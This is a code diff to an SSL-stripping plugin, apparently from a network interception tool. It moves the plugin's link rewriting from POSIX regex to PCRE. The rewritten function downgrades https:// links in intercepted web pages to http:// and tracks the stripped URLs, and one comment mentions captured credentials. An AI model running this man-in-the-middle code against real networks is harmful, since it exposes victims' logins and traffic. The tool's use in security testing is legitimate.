@@ -32,7 +32,8 @@
 
 #include <sys/wait.h>
 
-#include <regex.h>
+#ifdef HAVE_PCRE_H
+#include <pcre.h>
 
 #ifdef OS_LINUX
 #include <linux/netfilter_ipv4.h>
@@ -61,7 +62,8 @@
 #endif
 
 //#define URL_PATTERN "(href=|src=|url\\(|action=)?[\"']?(https)://([^ \r\\)/\"'>\\)]*)/?([^ \\)\"'>\\)\r]*)"
-#define URL_PATTERN "(href=|src=|url\\(|action=)?[\"']?(https)(\\%3A|\\%3a|:)//([^ \r\\)/\"'>\\)]*)/?([^ \\)\"'>\\)\r]*)"
+//#define URL_PATTERN "(href=|src=|url\\(|action=)?[\"']?(https)(\\%3A|\\%3a|:)//([^ \r\\)/\"'>\\)]*)/?([^ \\)\"'>\\)\r]*)"
+#define URL_PATTERN "(https://[\\w\\d:#@%/;$()~_?\\+-=\\\\.&]*)"
 
 
 #define REQUEST_TIMEOUT 120 /* If a request has not been used in 120 seconds, remove it from list */
@@ -139,7 +141,6 @@ static int main_fd;
 static u_int16 bind_port;
 static struct pollfd poll_fd;
 
-static regex_t *find_https_re = NULL;
 
 
 /* protos */
@@ -248,11 +249,10 @@ static int sslstrip_fini(void *dummy)
 
 	} while (!pthread_equal(pid, EC_PTHREAD_NULL));
 
-	if (find_https_re != NULL)
-		regfree(find_https_re);
-
-
 	close(main_fd);
+
+	/* Remove hook point */
+	hook_del(HOOK_HANDLED, &sslstrip);
 
 	return PLUGIN_FINISHED;
 }
@@ -260,7 +260,7 @@ static int sslstrip_fini(void *dummy)
 static int sslstrip_is_http(struct packet_object *po)
 {
 	/* if already coming from SSLStrip or proto is not TCP */
-	if (po->flags & PO_FROMSSLSTRIP || po->L4.proto != NL_TYPE_TCP)
+	if (po->L4.proto != NL_TYPE_TCP)
 		return 0;
 
 	if (ntohs(po->L4.dst) == 80 ||
@@ -326,9 +326,6 @@ static void sslstrip(struct packet_object *po)
 	if (!sslstrip_is_http(po))
 		return;	
 
-	/* If it's an HTTP packet, don't forward */
-	po->flags |= PO_DROPPED;
-
 #ifndef OS_LINUX
 	struct ec_session *s = NULL;
 
@@ -341,11 +338,11 @@ static void sslstrip(struct packet_object *po)
 	} else {
 		po->flags |= PO_IGNORE;
 	}
-#else
-	if (!(po->L4.flags & TH_PSH)) {
-		po->flags |= PO_IGNORE;
-	}
 #endif
+
+	char tmp1[MAX_ASCII_ADDR_LEN];
+	char tmp2[MAX_ASCII_ADDR_LEN];
+	DEBUG_MSG("Message from: %s to: %s", ip_addr_ntoa(&po->L3.src, tmp1), ip_addr_ntoa(&po->L3.dst, tmp2));
 }
 
 /* Unescape the string */
@@ -997,8 +994,9 @@ EC_THREAD_FUNC(http_child_thread)
 			packet_destroy_object(&po);
         		packet_disp_data(&po, po.DATA.data, po.DATA.len);
 
-        		DEBUG_MSG("SSLStrip: Calling parser for request");
-        		http_parse_packet(connection, HTTP_CLIENT, &po);
+        		//DEBUG_MSG("SSLStrip: Calling parser for request");
+        		//http_parse_packet(connection, HTTP_CLIENT, &po);
+			/* Avoid dupes creds */
 			http_handle_request(connection, &po);
 		}
 		
@@ -1010,101 +1008,87 @@ EC_THREAD_FUNC(http_child_thread)
 
 static void http_remove_https(struct http_connection *connection)
 {
-	regmatch_t match[6];
-	//char *buf = connection->response->html;
+	pcre *pcre;
 	char *buf_cpy = connection->response->html;
-
-
-	BUG_IF(buf_cpy == NULL);
-
-	char http[] = "http:";
-	size_t https_len = strlen("https");
-	char *host, *path;
+	const char *error;
+	int erroroffset;
+	size_t https_len = strlen("https://");
+	size_t http_len = strlen("http://");
 	struct https_link *l, *link;
-
-	if (find_https_re == NULL) {
-		SAFE_CALLOC(find_https_re, 1, sizeof(regex_t));
-		BUG_IF(find_https_re==NULL);
-
-		if (regcomp(find_https_re, URL_PATTERN, REG_EXTENDED | REG_NEWLINE | REG_ICASE))
-		{
-			ERROR_MSG("SSLStrip: Error compiling regular expression\n");
-			return;
-		}
-	}
-
+	int offset = 0;
+	int rc;
+	int ovector[30];
 	char changed = 0;
 	char *new_html;
-	size_t new_len = 0;
+	size_t new_size = 0;
+	size_t size = connection->response->len;
+	int i = 0;
+
+	if(!buf_cpy)
+		return;
+
+	pcre = pcre_compile(URL_PATTERN, PCRE_MULTILINE|PCRE_CASELESS, &error, &erroroffset, NULL);
+
+	if (!pcre) {
+		ERROR_MSG("pcre_compile failed (offset: %d), %s\n", erroroffset, error);
+		return;
+	}	
+
 
 	SAFE_CALLOC(new_html, 1, connection->response->len);
 	BUG_IF(new_html==NULL);
 
-	while(buf_cpy && !regexec(find_https_re, buf_cpy, 6, match, REG_NOTBOL))
-	{
-		host = strndup(buf_cpy + match[4].rm_so, match[4].rm_eo - match[4].rm_so);
-		/* if we have an empty path */
-		if (match[5].rm_so != -1 && match[5].rm_so != match[5].rm_eo)
-			path = strndup(buf_cpy + match[5].rm_so, match[5].rm_eo - match[5].rm_so);
-		else
-			path = strndup("/", 1);
+	while(offset < size && (rc = pcre_exec(pcre, NULL, buf_cpy, size, offset, 0, ovector, 30)) > 0) {
+		memcpy(new_html+new_size, buf_cpy+offset, ovector[2*i]-offset);
+		new_size += ovector[2*i]-offset;
 
-		DEBUG_MSG("SSLStrip: Found HTTPS in %s/%s", host, path);
+		char *url = strndup(buf_cpy+ovector[2*i]+https_len, 
+			(ovector[2*i+1] - ovector[2*i]) - https_len);
+		memcpy(new_html+new_size, "http://", http_len);
+		new_size += http_len;
+		memcpy(new_html+new_size, url, (ovector[2*i+1] - ovector[2*i]) - https_len);
+		new_size += (ovector[2*i+1] - ovector[2*i]) - https_len;
+		offset = ovector[1];
 
-		/* we don't add root url without href,src,action or url */
-		if (strcmp(path, "/") != 0 || match[1].rm_so != -1) {
+		//Add URL to list
+
+		char found = 0;
+		LIST_LOCK;
+		LIST_FOREACH(link, &https_links, next) {
+			if(!strcmp(link->url, url)) {
+				found=1;
+				break;
+			}	
+		}		
+
+		LIST_UNLOCK;
+
+		if(!found) {
 			SAFE_CALLOC(l, 1, sizeof(struct https_link));
 			BUG_IF(l==NULL);
 
-			SAFE_CALLOC(l->url, 1, strlen(host)+1+strlen(path)+1);
+			SAFE_CALLOC(l->url, 1, 1+((ovector[2*i+1] - ovector[2*i]) - https_len));
 			BUG_IF(l->url==NULL);
-			sprintf(l->url, "%s/%s", host, path);
+			memcpy(l->url, url, (ovector[2*i+1] - ovector[2*i]) - https_len);
 			Decode_Url((u_char *)l->url);
 			l->last_used = time(NULL);
-		
-			//Add to list	
-			char found = 0;
-	
-			LIST_LOCK;
-			LIST_FOREACH(link, &https_links, next) {
-				if(!strcmp(link->url, l->url)) {
-					found=1;	
-					break;
-				}
-			}
-
-			LIST_UNLOCK;
-
-			if(!found) {
-				DEBUG_MSG("SSLStrip: Inserting %s to HTTPS list", l->url);
-				LIST_INSERT_HEAD(&https_links, l, next);
-			}
+			DEBUG_MSG("SSLStrip: Inserting %s to HTTPS List", l->url);
+			LIST_INSERT_HEAD(&https_links, l, next);
 		}
 
-
-		memcpy(new_html+new_len, buf_cpy, match[2].rm_so);
-		new_len += match[2].rm_so;
-                memcpy(new_html+new_len, http, https_len);
-		new_len += strlen(http);
-
-
-                buf_cpy += match[3].rm_eo;
-
-                SAFE_FREE(host);
-                SAFE_FREE(path);
-                //SAFE_FREE(remaining);
-
+		SAFE_FREE(url);
+		
 		if (!changed)
 			changed=1;
-
 	}
 
+	
 	if (changed) {
-		//Copy remaining buf_cpy
-		memcpy(new_html+new_len, buf_cpy, strlen(buf_cpy));
+		//Copy rest of data (if any)
+		memcpy(new_html+new_size, buf_cpy+offset, size-offset);
 		SAFE_FREE(connection->response->html);	
 		connection->response->html = new_html;
-		connection->response->len = new_len;	
+		connection->response->len = new_size;	
 	} else {
 		/* Thanks but we don't need it */
 		SAFE_FREE(new_html);
@@ -1344,5 +1328,6 @@ void http_update_content_length(struct http_connection *connection) {
 }
 
 #endif /* HAVE_LIBCURL */
+#endif /* HAVE_PCRE_H */
 
 // vim:ts=3:expandtab
